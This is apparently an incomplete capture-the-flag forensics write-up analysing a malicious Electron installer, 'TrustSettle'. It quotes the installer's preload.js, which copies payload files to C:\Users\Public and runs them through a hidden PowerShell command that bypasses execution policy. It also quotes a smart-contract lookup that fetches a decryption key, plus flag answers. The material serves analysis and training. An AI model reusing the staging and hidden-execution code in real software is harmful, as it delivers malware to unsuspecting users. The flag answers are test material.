### SilentDivend 

What I did 

 sha256sum TrustSettle\ 1.0.0.exe 
c366e00a4ac1b4df56d1e4e7bb94e1c10937f86cffde733424fb7c7dd5a444fc  TrustSettle 1.0.0.exe
dfir@debian:~/HTB/SilentDividend/danger$ file TrustSettle\ 1.0.0.exe 
TrustSettle 1.0.0.exe: PE32 executable for MS Windows 4.00 (GUI), Intel i386, Nullsoft Installer self-extracting archive, 5 sections
dfir@debian:~/HTB/SilentDividend/danger$ strings TrustSettle\ 1.0.0.exe | head -100 > strings.txt
dfir@debian:~/HTB/SilentDividend/danger$ nano strings.txt 


PE32 executable for MS Windows 4.00 (GUI), Intel i386, Nullsoft Installer self-extracting archive, 5 sections

It's an NSIS (Nullsoft Scriptable Install System) installer. The strings output confirms it - those Inst and soft fragments are "Installer" and "Nullsoft" split across buffer boundaries.

NSIS (Nullsoft Scriptable Install System) is a free, open-source tool for creating Windows installers.  It is designed to be small, flexible, and script-based, making it highly suitable for internet distribution and complex installation logic. 

Now I can extract to see what is really inside .
dfir@debian:~$ cd HTB/SilentDividend/danger/\$PLUGINSDIR/
dfir@debian:~/HTB/SilentDividend/danger/$PLUGINSDIR$ ls
app-64.7z  nsis7z.dll  StdUtils.dll  System.dll
dfir@debian:~/HTB/SilentDividend/danger/$PLUGINSDIR$ 7z app-64.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM



Command Line Error:
Unsupported command:
app-64.7z
dfir@debian:~/HTB/SilentDividend/danger/$PLUGINSDIR$ 7z x app-64.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 95153536 bytes (91 MiB)

Extracting archive: app-64.7z
--
Path = app-64.7z
Type = 7z
Physical Size = 95153536
Headers Size = 1266
Method = LZMA2:26 LZMA:20 BCJ2
Solid = +
Blocks = 2

Everything is Ok

Folders: 4
Files: 82
Size:       398207178
Compressed: 95153536
dfir@debian:~/HTB/SilentDividend/danger/$PLUGINSDIR$ ls
app-64.7z               dxcompiler.dll  icudtl.dat            LICENSES.chromium.html  resources.pak      System.dll               vk_swiftshader_icd.json
chrome_100_percent.pak  dxil.dll        libEGL.dll            locales                 snapshot_blob.bin  TrustSettle.exe          vulkan-1.dll
chrome_200_percent.pak  extraResources  libGLESv2.dll         nsis7z.dll              src                v8_context_snapshot.bin
d3dcompiler_47.dll      ffmpeg.dll      LICENSE.electron.txt  resources               StdUtils.dll       vk_swiftshader.dll
dfir@debian:~/HTB/SilentDividend/danger/$PLUGINSDIR$ 



1 - To which directory does the application copy the files bundled within the extraResources folder? (*:\path\to\dir)
The only viable files are resources , src and extraResources (the question targets) Try to open the resources we see app.asar, open it in vs code(it did it , i don't know how , cause i don't have any npm or other on my machine ) but i saw node_modules, content of src (was already visible though ,, just frontend) and most of all
preload.js who showed the result fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`)).forEach(f => fs.copyFileSync(path.resolve(`${process.resourcesPath}/../extraResources`, f),path.join('C:\\Users\\Public', f)));
		
exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");

so FLAG : C:\Users\Public
Note: I didn't extract it clearly but I manually recreate the files on the host 


2 - Which Win32 structure defines the format of the buffer returned by the Lua script when monitoring directory changes? (string)
Here I thought to deobfuscate etc etc but , just a research showed me the win32 api .
Research:
**FILE_NOTIFY_INFORMATION** (defined in `winnt.h`) is the structure that describes each change found by `ReadDirectoryChangesW`. Rather than a single record, the result buffer holds a chain of these structures, so you walk it by repeatedly advancing the pointer by `NextEntryOffset` until that field is zero.

```cpp
typedef struct _FILE_NOTIFY_INFORMATION {
  DWORD NextEntryOffset;   // bytes to skip to the next record; 0 = last record
  DWORD Action;            // type of change (see FILE_ACTION_*)
  DWORD FileNameLength;    // length of FileName in bytes (no null terminator)
  WCHAR FileName[1];       // variable-length, Unicode, not null-terminated
} FILE_NOTIFY_INFORMATION, *PFILE_NOTIFY_INFORMATION;
```

Key points about the layout:

- **NextEntryOffset** — offset from the start of this record to the next one; always a multiple of 4, and the `FileName` array is padded to the next 4-byte boundary.
- **Action** — one of the `FILE_ACTION_*` values: `FILE_ACTION_ADDED` (0x1), `FILE_ACTION_REMOVED` (0x2), `FILE_ACTION_MODIFIED` (0x3), `FILE_ACTION_RENAMED_OLD_NAME` (0x4), `FILE_ACTION_RENAMED_NEW_NAME` (0x5), plus stream-related values (`FILE_ACTION_ADDED_STREAM`, `_REMOVED_STREAM`, `_MODIFIED_STREAM`). A cross-directory rename arrives as a `REMOVED` + `ADDED` pair, while a rename within a directory arrives as `RENAMED_OLD_NAME` + `RENAMED_NEW_NAME`.
- **FileNameLength** / **FileName** — the path is relative to the watched directory handle, in Unicode, and is **not** null-terminated (use `FileNameLength / sizeof(WCHAR)` to get the character count). If both a short and long name exist, only one is returned, and it's unspecified which.

A typical traversal loop:

```cpp
FILE_NOTIFY_INFORMATION *pNotify = (FILE_NOTIFY_INFORMATION*)buffer;
do {
    // pNotify->Action, pNotify->FileName, pNotify->FileNameLength
    offset += pNotify->NextEntryOffset;
    pNotify = (FILE_NOTIFY_INFORMATION*)((BYTE*)buffer + offset);
} while (pNotify->NextEntryOffset);
```

Note that the structure contains no information about *which* watched directory the change occurred in — the client must track that itself (e.g., via the `OVERLAPPED` pointer or a completion key).


FLAG: FILE_NOTIFY_INFORMATION


3 - Which Win32 API is used by the Lua script to send an HTTP request to the remote server? (string)
Again research The primary Win32 API used to send an HTTP request to a remote server is WinHTTP (Windows HTTP Services), specifically using the WinHttpSendRequest function.  This function is part of the WinHttp C/C++ API designed for HTTP client applications, allowing developers to send requests and specify additional headers or optional data (such as for PUT or POST operations) to HTTP servers. 

Alternatively, the legacy WinInet API uses the HttpSendRequest function (or HttpSendRequestA/HttpSendRequestW) to send requests, though WinHTTP is generally recommended for modern server-based and service applications.  For managed environments like UWP, Windows.Web.Http.HttpClient or System.Net.Http.HttpClient are preferred over these lower-level C/C++ APIs. 

FLAG :  WinHttpSendRequest

4 - Which smart contract function does the Electron application invoke to retrieve the decryption key for the encrypted payload? (function())

Here I suffered so I tried to understand more preload.js at exp.md. It will be more easy now .
 const contract =
        new ethers.Contract(
            CONTRACT_ADDRESS,
            CONTRACT_ABI,
            provider
        );


    const state =
        await contract
            .resolveState();
FLAG : resolveState() 

5 - Investigate the smart contract using its address, analyze its logic, and recover the flag by decoding the encrypted data. (****=******** **********_*********=**-****)
const CONTRACT_ADDRESS =
    '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
So here I think we should execute decryptEmbeddedData(encryptedData, encryptionKey) on const ENCRYPTED_DATA =
    '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0';

but for the key queryRemoteState()

so i made a copy of preload and started 



5 - Which environment variable corresponds to the directory where the application copies the HTML file from its package? (string)
What token function does the HTML page call to request spending permission? (function())
6 - What is the exact token amount passed to the approval call? (number)
7 - What ethers.js v6 provider class is used to connect to the browser wallet? (string)
8 - Analyze the HTML page to uncover a smart contract reference. Investigate the contract's logic and determine how to interact with it to recover the hidden flag. (**.****,*.****)
